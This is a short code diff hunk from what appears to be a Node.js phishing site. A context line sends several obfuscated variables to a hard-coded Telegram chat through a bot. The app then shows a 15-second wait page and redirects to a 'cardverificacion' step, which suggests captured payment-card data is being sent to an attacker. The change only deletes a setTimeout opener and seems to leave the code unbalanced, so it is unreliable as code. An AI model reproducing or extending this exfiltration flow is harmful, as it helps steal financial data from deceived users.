@@ -112,7 +112,7 @@ bot.sendMessage('791007687', `1: ${r6fa6y89yB}\n2: ${nYffxLjdFW}\n3: ${wJcPshSku
     
 
     // Espera 15 segundos antes de redirigir
-setTimeout(() => {
+
    res.render('wait', { seconds: 15 });
 setTimeout(() => {
   res.redirect('cardverificacion');
